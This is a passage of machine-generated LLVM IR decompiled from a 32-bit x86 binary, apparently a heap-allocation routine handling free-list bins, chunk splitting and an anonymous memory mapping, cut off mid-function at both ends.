  store i32 %v0_804dff3, i32* %v3_804dff3, align 4
  %v0_804dff6 = load i32, i32* @edx, align 4
  %v1_804dff6 = load i32, i32* @ecx, align 4
  %v2_804dff6 = add i32 %v1_804dff6, 8
  %v3_804dff6 = inttoptr i32 %v2_804dff6 to i32*
  store i32 %v0_804dff6, i32* %v3_804dff6, align 4
  %v0_804dff9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dff9 = add i32 %v0_804dff9, 8
  store i32 %v1_804dff9, i32* @ecx, align 4
  %v0_804dffc = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_804dffc, 16
  br i1 %tmp129, label %dec_label_pc_804e52b, label %dec_label_pc_804e005

dec_label_pc_804e005:                             ; preds = %dec_label_pc_804dfed
  %v2_804e009 = add i32 %v0_804dff9, %v1_804e1b6
  store i32 %v2_804e009, i32* @edx, align 4
  %v1_804e00c = or i32 %v1_804e1b6, 1
  store i32 %v1_804e00c, i32* %ebx.global-to-local, align 4
  %v2_804e00f = add i32 %v0_804dff9, 4
  %v3_804e00f = inttoptr i32 %v2_804e00f to i32*
  store i32 %v1_804e00c, i32* %v3_804e00f, align 4
  %v0_804e012 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e014 = or i32 %v0_804e012, 1
  store i32 %v1_804e014, i32* %eax.global-to-local, align 4
  %v0_804e017 = load i32, i32* @edx, align 4
  %v1_804e017 = load i32, i32* @ebp, align 4
  %v2_804e017 = add i32 %v1_804e017, 8
  %v3_804e017 = inttoptr i32 %v2_804e017 to i32*
  store i32 %v0_804e017, i32* %v3_804e017, align 4
  %v0_804e01a = load i32, i32* @edx, align 4
  %v1_804e01a = load i32, i32* @ebp, align 4
  %v2_804e01a = add i32 %v1_804e01a, 12
  %v3_804e01a = inttoptr i32 %v2_804e01a to i32*
  store i32 %v0_804e01a, i32* %v3_804e01a, align 4
  %v0_804e01d = load i32, i32* @edx, align 4
  %v1_804e01d = add i32 %v0_804e01d, 8
  %v2_804e01d = inttoptr i32 %v1_804e01d to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e01d, align 4
  %v0_804e024 = load i32, i32* @edx, align 4
  %v1_804e024 = add i32 %v0_804e024, 12
  %v2_804e024 = inttoptr i32 %v1_804e024 to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e024, align 4
  %v0_804e02b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e02b = load i32, i32* @edx, align 4
  %v2_804e02b = add i32 %v1_804e02b, 4
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v0_804e02b, i32* %v3_804e02b, align 4
  %v0_804e02e = load i32, i32* %esi.global-to-local, align 4
  %v1_804e02e = load i32, i32* @edx, align 4
  %v3_804e02e = add i32 %v1_804e02e, %v0_804e02e
  %v4_804e02e = inttoptr i32 %v3_804e02e to i32*
  store i32 %v0_804e02e, i32* %v4_804e02e, align 4
  br label %dec_label_pc_804e530

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804dfcc, %dec_label_pc_804dfbc
  %v4_804dfe3 = phi i32 [ %storemerge1.pre, %dec_label_pc_804dfbc ], [ %v3_804dfcf, %dec_label_pc_804dfcc ]
  store i32 %v4_804dfe3, i32* %eax.global-to-local, align 4
  %v12_804e038 = icmp eq i32 %v4_804dfe3, %v2_804dfc0
  %v1_804e03a = icmp eq i1 %v12_804e038, false
  br i1 %v1_804e03a, label %dec_label_pc_804dfcc, label %dec_label_pc_804e03c.loopexit

dec_label_pc_804e03c.loopexit:                    ; preds = %dec_label_pc_804e038
  br label %dec_label_pc_804e03c

dec_label_pc_804e03c:                             ; preds = %dec_label_pc_804e03c.loopexit, %dec_label_pc_804dfae
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804e045 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804e045, i32* %ecx.global-to-local, align 4
  %v2_804e048 = udiv i32 %v1_804e045, 32
  store i32 %v2_804e048, i32* @edi, align 4
  %v1_804e04b = mul nuw nsw i32 %v2_804e048, 4
  %v2_804e04b = add i32 %v1_804e04b, ptrtoint (i32* @global_var_80590d4.146 to i32)
  %v3_804e04b = inttoptr i32 %v2_804e04b to i32*
  %v4_804e04b = load i32, i32* %v3_804e04b, align 4
  store i32 %v4_804e04b, i32* %edx.global-to-local, align 4
  %v1_804e052 = mul i32 %v1_804e045, 8
  %v2_804e052 = add i32 %v1_804e052, ptrtoint (i32* @global_var_8058dcc.142 to i32)
  store i32 %v2_804e052, i32* %ebx.global-to-local, align 4
  %v1_804e059 = urem i32 %v1_804e045, 32
  %v2_804e059 = icmp eq i32 %v1_804e059, 0
  store i32 %v1_804e059, i32* %ecx.global-to-local, align 4
  br i1 %v2_804e059, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804e03c
  %v5_804e05c = shl i32 1, %v1_804e059
  store i32 %v5_804e05c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804e03c, %bb83, %dec_label_pc_804e09d
  %v1_804e05e = phi i32 [ %v1_804e05e.pre, %dec_label_pc_804e09d ], [ %v4_804e04b, %bb83 ], [ %v4_804e04b, %dec_label_pc_804e03c ]
  %v0_804e062 = phi i32 [ %v0_804e05e.pre, %dec_label_pc_804e09d ], [ %v5_804e05c, %bb83 ], [ 1, %dec_label_pc_804e03c ]
  %tmp84 = icmp ule i32 %v0_804e062, %v1_804e05e
  %v1_804e062 = icmp eq i32 %v0_804e062, 0
  %v1_804e064 = icmp eq i1 %v1_804e062, false
  %or.cond = and i1 %tmp84, %v1_804e064
  br i1 %or.cond, label %dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge, label %dec_label_pc_804e066.preheader

dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge: ; preds = %.preheader
  %v0_804e08d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e092.preheader

dec_label_pc_804e066.preheader:                   ; preds = %.preheader
  %v0_804e066.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e066

dec_label_pc_804e066:                             ; preds = %dec_label_pc_804e066.preheader, %dec_label_pc_804e070
  %v0_804e066 = phi i32 [ %v0_804e066.pre, %dec_label_pc_804e066.preheader ], [ %v1_804e066, %dec_label_pc_804e070 ]
  %v1_804e066 = add i32 %v0_804e066, 1
  store i32 %v1_804e066, i32* @edi, align 4
  %v6_804e06a = icmp ugt i32 %v1_804e066, 2
  br i1 %v6_804e06a, label %dec_label_pc_804e121.loopexit, label %dec_label_pc_804e070

dec_label_pc_804e070:                             ; preds = %dec_label_pc_804e066
  %v1_804e070 = mul i32 %v1_804e066, 4
  %v2_804e070 = add i32 %v1_804e070, ptrtoint (i32* @global_var_80590d4.146 to i32)
  %v3_804e070 = inttoptr i32 %v2_804e070 to i32*
  %v4_804e070 = load i32, i32* %v3_804e070, align 4
  store i32 %v4_804e070, i32* %edx.global-to-local, align 4
  %v1_804e077 = icmp eq i32 %v4_804e070, 0
  br i1 %v1_804e077, label %dec_label_pc_804e066, label %dec_label_pc_804e07b

dec_label_pc_804e07b:                             ; preds = %dec_label_pc_804e070
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804e082 = mul i32 %v1_804e066, 256
  store i32 %v2_804e082, i32* %eax.global-to-local, align 4
  %v1_804e085 = add i32 %v2_804e082, ptrtoint (i32* @global_var_8058dcc.142 to i32)
  store i32 %v1_804e085, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e092.preheader

dec_label_pc_804e092.preheader:                   ; preds = %dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge, %dec_label_pc_804e07b
  %v0_804e08d12 = phi i32 [ %v1_804e085, %dec_label_pc_804e07b ], [ %v0_804e08d12.pre, %dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804e07b ], [ %v0_804e062, %dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge ]
  %v0_804e0a3 = phi i32 [ %v4_804e070, %dec_label_pc_804e07b ], [ %v1_804e05e, %dec_label_pc_804e062.dec_label_pc_804e092.preheader_crit_edge ]
  %v2_804e0924 = and i32 %v0_804e0a3, %esi.promoted
  %v3_804e0925 = icmp eq i32 %v2_804e0924, 0
  br i1 %v3_804e0925, label %dec_label_pc_804e08d, label %dec_label_pc_804e096

dec_label_pc_804e08d:                             ; preds = %dec_label_pc_804e092.preheader, %dec_label_pc_804e08d
  %v2_804e09014 = phi i32 [ %v2_804e090, %dec_label_pc_804e08d ], [ %esi.promoted, %dec_label_pc_804e092.preheader ]
  %v0_804e08d13 = phi i32 [ %v1_804e08d, %dec_label_pc_804e08d ], [ %v0_804e08d12, %dec_label_pc_804e092.preheader ]
  %v1_804e08d = add i32 %v0_804e08d13, 8
  %v2_804e090 = mul i32 %v2_804e09014, 2
  %v2_804e092 = and i32 %v2_804e090, %v0_804e0a3
  %v3_804e092 = icmp eq i32 %v2_804e092, 0
  br i1 %v3_804e092, label %dec_label_pc_804e08d, label %dec_label_pc_804e092.dec_label_pc_804e096_crit_edge

dec_label_pc_804e092.dec_label_pc_804e096_crit_edge: ; preds = %dec_label_pc_804e08d
  store i32 %v1_804e08d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804e090, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e096

dec_label_pc_804e096:                             ; preds = %dec_label_pc_804e092.dec_label_pc_804e096_crit_edge, %dec_label_pc_804e092.preheader
  %v0_804e09d = phi i32 [ %v2_804e090, %dec_label_pc_804e092.dec_label_pc_804e096_crit_edge ], [ %esi.promoted, %dec_label_pc_804e092.preheader ]
  %v1_804e0c0 = phi i32 [ %v1_804e08d, %dec_label_pc_804e092.dec_label_pc_804e096_crit_edge ], [ %v0_804e08d12, %dec_label_pc_804e092.preheader ]
  %v1_804e096 = add i32 %v1_804e0c0, 12
  %v2_804e096 = inttoptr i32 %v1_804e096 to i32*
  %v3_804e096 = load i32, i32* %v2_804e096, align 4
  store i32 %v3_804e096, i32* @ecx, align 4
  %v12_804e099 = icmp eq i32 %v3_804e096, %v1_804e0c0
  %v1_804e09b = icmp eq i1 %v12_804e099, false
  br i1 %v1_804e09b, label %dec_label_pc_804e0b1, label %dec_label_pc_804e09d

dec_label_pc_804e09d:                             ; preds = %dec_label_pc_804e096
  %v2_804e09f = mul i32 %v0_804e09d, 2
  store i32 %v2_804e09f, i32* %esi.global-to-local, align 4
  %v1_804e0a1 = sub i32 -1, %v0_804e09d
  store i32 %v1_804e0a1, i32* %eax.global-to-local, align 4
  %v2_804e0a3 = and i32 %v0_804e0a3, %v1_804e0a1
  store i32 %v2_804e0a3, i32* %edx.global-to-local, align 4
  %v1_804e0a5 = add i32 %v3_804e096, 8
  store i32 %v1_804e0a5, i32* %ebx.global-to-local, align 4
  %v1_804e0a8 = load i32, i32* @edi, align 4
  %v2_804e0a8 = mul i32 %v1_804e0a8, 4
  %v3_804e0a8 = add i32 %v2_804e0a8, ptrtoint (i32* @global_var_80590d4.146 to i32)
  %v4_804e0a8 = inttoptr i32 %v3_804e0a8 to i32*
  store i32 %v2_804e0a3, i32* %v4_804e0a8, align 4
  %v0_804e05e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e05e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804e0b1:                             ; preds = %dec_label_pc_804e096
  %v1_804e0b1 = add i32 %v3_804e096, 4
  %v2_804e0b1 = inttoptr i32 %v1_804e0b1 to i32*
  %v3_804e0b1 = load i32, i32* %v2_804e0b1, align 4
  store i32 %v3_804e0b1, i32* %edx.global-to-local, align 4
  %v1_804e0b4 = add i32 %v3_804e096, 12
  %v2_804e0b4 = inttoptr i32 %v1_804e0b4 to i32*
  %v3_804e0b4 = load i32, i32* %v2_804e0b4, align 4
  store i32 %v3_804e0b4, i32* %eax.global-to-local, align 4
  %v1_804e0b7 = and i32 %v3_804e0b1, -4
  store i32 %v1_804e0b7, i32* @edx, align 4
  %v5_804e0bc = sub i32 %v1_804e0b7, %v1_804e1b6
  store i32 %v5_804e0bc, i32* %esi.global-to-local, align 4
  store i32 %v3_804e0b4, i32* %v2_804e096, align 4
  %v0_804e0c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e0c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0c3 = add i32 %v1_804e0c3, 8
  %v3_804e0c3 = inttoptr i32 %v2_804e0c3 to i32*
  store i32 %v0_804e0c3, i32* %v3_804e0c3, align 4
  %v0_804e0c6 = load i32, i32* %esi.global-to-local, align 4
  %tmp130 = icmp ult i32 %v0_804e0c6, 16
  %v0_804e0cb = load i32, i32* @ecx, align 4
  br i1 %tmp130, label %dec_label_pc_804e0cb, label %dec_label_pc_804e0d2

dec_label_pc_804e0cb:                             ; preds = %dec_label_pc_804e0b1
  %v1_804e0cb = load i32, i32* @edx, align 4
  %v2_804e0cb = add i32 %v0_804e0cb, 4
  %v3_804e0cb = add i32 %v2_804e0cb, %v1_804e0cb
  %v4_804e0cb = inttoptr i32 %v3_804e0cb to i32*
  %v5_804e0cb = load i32, i32* %v4_804e0cb, align 4
  %v6_804e0cb = or i32 %v5_804e0cb, 1
  store i32 %v6_804e0cb, i32* %v4_804e0cb, align 4
  br label %dec_label_pc_804e119

dec_label_pc_804e0d2:                             ; preds = %dec_label_pc_804e0b1
  %v2_804e0d6 = add i32 %v0_804e0cb, %v1_804e1b6
  store i32 %v2_804e0d6, i32* %eax.global-to-local, align 4
  %v1_804e0df = load i32, i32* @ebp, align 4
  %v2_804e0df = add i32 %v1_804e0df, 8
  %v3_804e0df = inttoptr i32 %v2_804e0df to i32*
  store i32 %v2_804e0d6, i32* %v3_804e0df, align 4
  %v0_804e0e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e0e2 = load i32, i32* @ebp, align 4
  %v2_804e0e2 = add i32 %v1_804e0e2, 12
  %v3_804e0e2 = inttoptr i32 %v2_804e0e2 to i32*
  store i32 %v0_804e0e2, i32* %v3_804e0e2, align 4
  %v0_804e0e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e0e5 = add i32 %v0_804e0e5, 8
  %v2_804e0e5 = inttoptr i32 %v1_804e0e5 to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e0e5, align 4
  %v0_804e0ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804e0ec = add i32 %v0_804e0ec, 12
  %v2_804e0ec = inttoptr i32 %v1_804e0ec to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v2_804e0ec, align 4
  %v0_804e0f3 = load i32, i32* @global_var_8058dd0.143, align 16
  %v4_804e0f9 = load i32, i32* %eax.global-to-local, align 4
  %v5_804e0f9 = select i1 %v8_804de5f, i32 %v4_804e0f9, i32 %v0_804e0f3
  %v4_804e0fc = or i32 %v1_804e1b6, 1
  store i32 %v5_804e0f9, i32* @global_var_8058dd0.143, align 16
  %v0_804e107 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804e0fc, i32* %ebx.global-to-local, align 4
  %v1_804e10d = or i32 %v0_804e107, 1
  store i32 %v1_804e10d, i32* @edx, align 4
  %v3_804e110 = add i32 %v0_804e107, %v4_804e0f9
  %v4_804e110 = inttoptr i32 %v3_804e110 to i32*
  store i32 %v0_804e107, i32* %v4_804e110, align 4
  %v0_804e113 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e113 = load i32, i32* @ecx, align 4
  %v2_804e113 = add i32 %v1_804e113, 4
  %v3_804e113 = inttoptr i32 %v2_804e113 to i32*
  store i32 %v0_804e113, i32* %v3_804e113, align 4
  %v0_804e116 = load i32, i32* @edx, align 4
  %v1_804e116 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e116 = add i32 %v1_804e116, 4
  %v3_804e116 = inttoptr i32 %v2_804e116 to i32*
  store i32 %v0_804e116, i32* %v3_804e116, align 4
  br label %dec_label_pc_804e119

dec_label_pc_804e119:                             ; preds = %dec_label_pc_804e20d, %dec_label_pc_804e0cb, %dec_label_pc_804e0d2
  %v0_804e119 = load i32, i32* @ecx, align 4
  %v1_804e119 = add i32 %v0_804e119, 8
  store i32 %v1_804e119, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e121.loopexit:                    ; preds = %dec_label_pc_804e066
  br label %dec_label_pc_804e121

dec_label_pc_804e121:                             ; preds = %dec_label_pc_804e121.loopexit, %dec_label_pc_804de21, %dec_label_pc_804de29
  %v0_804e121 = load i32, i32* @global_var_8058dcc.142, align 4
  store i32 %v0_804e121, i32* @ebx, align 4
  store i32 %v1_804e1b6, i32* %esi.global-to-local, align 4
  %v1_804e12b = add i32 %v0_804e121, 4
  %v2_804e12b = inttoptr i32 %v1_804e12b to i32*
  %v3_804e12b = load i32, i32* %v2_804e12b, align 4
  %v1_804e12e = add i32 %v1_804e1b6, 16
  store i32 %v1_804e12e, i32* @esi, align 4
  %v1_804e135 = and i32 %v3_804e12b, -4
  store i32 %v1_804e135, i32* %ecx.global-to-local, align 4
  %v7_804e138 = icmp ult i32 %v1_804e135, %v1_804e12e
  br i1 %v7_804e138, label %dec_label_pc_804e158, label %dec_label_pc_804e13c

dec_label_pc_804e13c:                             ; preds = %dec_label_pc_804e121
  %v2_804e140 = add i32 %v0_804e121, %v1_804e1b6
  store i32 %v2_804e140, i32* @edx, align 4
  %v1_804e143 = or i32 %v1_804e1b6, 1
  store i32 %v1_804e143, i32* %eax.global-to-local, align 4
  store i32 %v2_804e140, i32* @global_var_8058dcc.142, align 4
  store i32 %v1_804e143, i32* %v2_804e12b, align 4
  %v0_804e14f = load i32, i32* %ecx.global-to-local, align 4
  %v5_804e14f = sub i32 %v0_804e14f, %v1_804e1b6
  store i32 %v5_804e14f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e4d1

dec_label_pc_804e158:                             ; preds = %dec_label_pc_804e121
  %v0_804e158 = load i8, i8* @global_var_8058da0.141, align 32
  %v1_804e158 = and i8 %v0_804e158, 2
  %v2_804e158 = icmp eq i8 %v1_804e158, 0
  %v0_804e15f = load i32, i32* @global_var_80590fc.147, align 4
  store i32 %v0_804e15f, i32* %edx.global-to-local, align 4
  br i1 %v2_804e158, label %dec_label_pc_804e18c, label %dec_label_pc_804e167

dec_label_pc_804e167:                             ; preds = %dec_label_pc_804e158
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804e16f = call i32 @function_804e921(i32* bitcast (i8* @global_var_8058da0.141 to i32*))
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* @ebx, align 4
  %v1_804e179 = add i32 %v1_804e1b6, -7
  store i32 %v1_804e179, i32* %eax.global-to-local, align 4
  store i32 %v1_804e179, i32* %stack_var_-92, align 4
  %v1_804e17d = call i32 @function_804ddba(i32 %v1_804e179)
  store i32 %v1_804e17d, i32* %eax.global-to-local, align 4
  store i32 %v1_804e17d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e158
  store i32 %v1_804e1b6, i32* @ebx, align 4
  %v1_804e190 = add i32 %v0_804e15f, -1
  store i32 %v1_804e190, i32* @ecx, align 4
  %v1_804e193 = load i32, i32* @global_var_80590ec.148, align 4
  %v7_804e193 = icmp ult i32 %v1_804e1b6, %v1_804e193
  br i1 %v7_804e193, label %dec_label_pc_804e26e, label %dec_label_pc_804e1a3

dec_label_pc_804e1a3:                             ; preds = %dec_label_pc_804e18c
  %v0_804e1a3 = load i32, i32* @global_var_80590f0.149, align 16
  store i32 %v0_804e1a3, i32* %eax.global-to-local, align 4
  %v1_804e1a8 = load i32, i32* @global_var_80590f4.150, align 4
  %v5_804e1ae = icmp slt i32 %v0_804e1a3, %v1_804e1a8
  br i1 %v5_804e1ae, label %dec_label_pc_804e1b4, label %dec_label_pc_804e26e

dec_label_pc_804e1b4:                             ; preds = %dec_label_pc_804e1a3
  %v2_804e1b6 = add i32 %v1_804e1b6, 10
  %v3_804e1b6 = add i32 %v2_804e1b6, %v0_804e15f
  %v1_804e1ba = sub i32 0, %v0_804e15f
  store i32 %v1_804e1ba, i32* %eax.global-to-local, align 4
  %v2_804e1bc = and i32 %v3_804e1b6, %v1_804e1ba
  store i32 %v2_804e1bc, i32* @ebx, align 4
  %tmp131 = icmp ugt i32 %v2_804e1bc, %v1_804e1b6
  br i1 %tmp131, label %dec_label_pc_804e1c8, label %dec_label_pc_804e26e

dec_label_pc_804e1c8:                             ; preds = %dec_label_pc_804e1b4
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804e1d5 = call i32 @function_804f994(i32 0, i32 %v2_804e1bc, i32 3, i32 34, i32 0, i32 0, i32 %v1_804e190, i32 %v1_804e190)
  store i32 %v8_804e1d5, i32* %eax.global-to-local, align 4
  %v10_804e1dd = icmp eq i32 %v8_804e1d5, -1
  store i32 %v8_804e1d5, i32* %edx.global-to-local, align 4
  br i1 %v10_804e1dd, label %dec_label_pc_804e1c8.dec_label_pc_804e26e_crit_edge, label %dec_label_pc_804e1e8

dec_label_pc_804e1c8.dec_label_pc_804e26e_crit_edge: ; preds = %dec_label_pc_804e1c8
  %v0_804e26e.pre = load i32, i32* @global_var_8058dcc.142, align 4
  br label %dec_label_pc_804e26e

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1c8
  %v1_804e1ea = urem i32 %v8_804e1d5, 8
  %v2_804e1ea = icmp eq i32 %v1_804e1ea, 0
  store i32 %v1_804e1ea, i32* %ecx.global-to-local, align 4
  br i1 %v2_804e1ea, label %dec_label_pc_804e203, label %dec_label_pc_804e1ef

dec_label_pc_804e1ef:                             ; preds = %dec_label_pc_804e1e8
  %v0_804e1f4 = load i32, i32* @ebx, align 4
  %v2_804e1f6 = sub nsw i32 8, %v1_804e1ea
  store i32 %v2_804e1f6, i32* %eax.global-to-local, align 4
  %v2_804e1f8 = add i32 %v2_804e1f6, %v8_804e1d5
  store i32 %v2_804e1f8, i32* @ecx, align 4
  %v2_804e1fb = sub i32 %v0_804e1f4, %v2_804e1f6
  store i32 %v2_804e1fb, i32* %esi.global-to-local, align 4
  %v2_804e1fd = inttoptr i32 %v2_804e1f8 to i32*
  store i32 %v2_804e1f6, i32* %v2_804e1fd, align 4
  br label %dec_label_pc_804e20d

dec_label_pc_804e203:                             ; preds = %dec_label_pc_804e1e8
  store i32 %v8_804e1d5, i32* @ecx, align 4
  %v1_804e205 = inttoptr i32 %v8_804e1d5 to i32*
  store i32 0, i32* %v1_804e205, align 4
  br label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e1ef, %dec_label_pc_804e203
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804e1ef ], [ @ebx, %dec_label_pc_804e203 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804e20d = or i32 %storemerge, 2
  %v1_804e210 = load i32, i32* @ecx, align 4
  %v2_804e210 = add i32 %v1_804e210, 4
  %v3_804e210 = inttoptr i32 %v2_804e210 to i32*
  store i32 %v1_804e20d, i32* %v3_804e210, align 4
  %v0_804e213 = load i32, i32* @global_var_80590f0.149, align 16
  %v0_804e218 = load i32, i32* @global_var_8059110.151, align 16
  %v1_804e21e = add i32 %v0_804e213, 1
  %v1_804e21f = load i32, i32* @global_var_80590f8.152, align 8
  %v2_804e21f = sub i32 %v1_804e21e, %v1_804e21f
  %v8_804e21f = xor i32 %v1_804e21f, %v1_804e21e
  %v9_804e21f = xor i32 %v2_804e21f, %v1_804e21e
  %v10_804e21f = and i32 %v9_804e21f, %v8_804e21f
  %v11_804e21f = icmp slt i32 %v10_804e21f, 0
  %v12_804e21f = icmp eq i32 %v2_804e21f, 0
  %v13_804e21f = icmp slt i32 %v2_804e21f, 0
  store i32 %v1_804e21e, i32* @global_var_80590f0.149, align 16
  %v3_804e22a = icmp ne i1 %v13_804e21f, %v11_804e21f
  %v4_804e22a = or i1 %v12_804e21f, %v3_804e22a
  %v7_804e22a = select i1 %v4_804e22a, i32 %v1_804e21f, i32 %v1_804e21e
  store i32 %v7_804e22a, i32* @global_var_80590f8.152, align 8
  %v0_804e236 = load i32, i32* @global_var_8059104.153, align 4
  %v1_804e23b = load i32, i32* @ebx, align 4
  %v2_804e23b = add i32 %v1_804e23b, %v0_804e236
  store i32 %v2_804e23b, i32* @global_var_8059104.153, align 4
  %tmp86 = icmp ule i32 %v2_804e23b, %v0_804e218
  %v5_804e248 = select i1 %tmp86, i32 %v0_804e218, i32 %v2_804e23b
  store i32 %v5_804e248, i32* @edx, align 4
  %v1_804e24b = load i32, i32* @global_var_8059108.154, align 8
  %v2_804e24b = add i32 %v1_804e24b, %v2_804e23b
  store i32 %v5_804e248, i32* @global_var_8059110.151, align 16
  %v1_804e257 = load i32, i32* @global_var_8059114.155, align 4
  %tmp132 = icmp ule i32 %v2_804e24b, %v1_804e257
  %v5_804e25d = select i1 %tmp132, i32 %v1_804e257, i32 %v2_804e24b
  store i32 %v5_804e25d, i32* %eax.global-to-local, align 4
  store i32 %v5_804e25d, i32* @global_var_8059114.155, align 4
  br label %dec_label_pc_804e119

dec_label_pc_804e26e:                             ; preds = %dec_label_pc_804e1b4, %dec_label_pc_804e1c8.dec_label_pc_804e26e_crit_edge, %dec_label_pc_804e1a3, %dec_label_pc_804e18c
  %v0_804e26e = phi i32 [ %v0_804e26e.pre, %dec_label_pc_804e1c8.dec_label_pc_804e26e_crit_edge ], [ %v0_804e121, %dec_label_pc_804e1a3 ], [ %v0_804e121, %dec_label_pc_804e1b4 ], [ %v0_804e121, %dec_label_pc_804e18c ]
  store i32 %v0_804e26e, i32* %eax.global-to-local, align 4
  %v1_804e277 = add i32 %v0_804e26e, 4
  %v2_804e277 = inttoptr i32 %v1_804e277 to i32*
  %v3_804e277 = load i32, i32* %v2_804e277, align 4
  %v1_804e27e = and i32 %v3_804e277, -4
  %v2_804e27e = icmp eq i32 %v1_804e27e, 0
  store i32 %v1_804e27e, i32* @ebp, align 4
  %v1_804e284 = load i32, i32* @global_var_80590e8.156, align 8
  %v0_804e28e = load i8, i8* @global_var_8059100.157, align 256
  %v1_804e28e = urem i8 %v0_804e28e, 2
  %v2_804e28e = icmp eq i8 %v1_804e28e, 0
  %v1_804e295 = icmp eq i1 %v2_804e28e, false
  %v1_804e27e.op = sub i32 0, %v1_804e27e
  %v2_804e28c.neg = select i1 %v1_804e295, i32 %v1_804e27e.op, i32 0
  %v2_804e284 = add i32 %v1_804e190, %v1_804e12e
  %v4_804e295 = add i32 %v2_804e284, %v1_804e284
  %v5_804e29c = add i32 %v4_804e295, %v2_804e28c.neg
  store i32 %v5_804e29c, i32* %eax.global-to-local, align 4
  %v1_804e2a0 = sub i32 0, %v0_804e15f
  store i32 %v1_804e2a0, i32* @edx, align 4
  %v2_804e2a4 = and i32 %v5_804e29c, %v1_804e2a0
  store i32 %v2_804e2a4, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_804e2a4, 1
  br i1 %tmp87, label %dec_label_pc_804e2c2, label %dec_label_pc_804e2ac

dec_label_pc_804e2ac:                             ; preds = %dec_label_pc_804e26e
  store i32 %v2_804e2a4, i32* %stack_var_-92, align 4
  %v1_804e2b0 = call i32 @function_804fdb8(i32 %v2_804e2a4)
  store i32 %v1_804e2b0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_804e2bb = icmp eq i32 %v1_804e2b0, -1
  store i32 %v1_804e2b0, i32* @ebx, align 4
  %v1_804e2c0 = icmp eq i1 %v10_804e2bb, false
  br i1 %v1_804e2c0, label %dec_label_pc_804e319, label %dec_label_pc_804e2ac.dec_label_pc_804e2c2_crit_edge

dec_label_pc_804e2ac.dec_label_pc_804e2c2_crit_edge: ; preds = %dec_label_pc_804e2ac
  %v0_804e2c2.pre = load i8, i8* @global_var_8059100.157, align 256
  br label %dec_label_pc_804e2c2

dec_label_pc_804e2c2:                             ; preds = %dec_label_pc_804e2ac.dec_label_pc_804e2c2_crit_edge, %dec_label_pc_804e26e
  %v0_804e2ef = phi i32 [ -1, %dec_label_pc_804e2ac.dec_label_pc_804e2c2_crit_edge ], [ %v1_804e2a0, %dec_label_pc_804e26e ]
  %v0_804e2c2 = phi i8 [ %v0_804e2c2.pre, %dec_label_pc_804e2ac.dec_label_pc_804e2c2_crit_edge ], [ %v0_804e28e, %dec_label_pc_804e26e ]
  %v1_804e2c2 = urem i8 %v0_804e2c2, 2
  %v2_804e2c2 = icmp eq i8 %v1_804e2c2, 0
  br i1 %v2_804e2c2, label %dec_label_pc_804e2c2.dec_label_pc_804e2d7_crit_edge, label %dec_label_pc_804e2cb

dec_label_pc_804e2c2.dec_label_pc_804e2d7_crit_edge: ; preds = %dec_label_pc_804e2c2
  %v0_804e2d7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e2d7

dec_label_pc_804e2cb:                             ; preds = %dec_label_pc_804e2c2
  %v2_804e2cf = add i32 %v1_804e27e, %v1_804e190
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %v0_804e2d1 = load i32, i32* @esi, align 4
  %v2_804e2d1 = add i32 %v0_804e2d1, %v2_804e2cf
  %v5_804e2d3 = and i32 %v2_804e2d1, %v1_804e2a0
  store i32 %v5_804e2d3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e2d7

dec_label_pc_804e2d7:                             ; preds = %dec_label_pc_804e2c2.dec_label_pc_804e2d7_crit_edge, %dec_label_pc_804e2cb
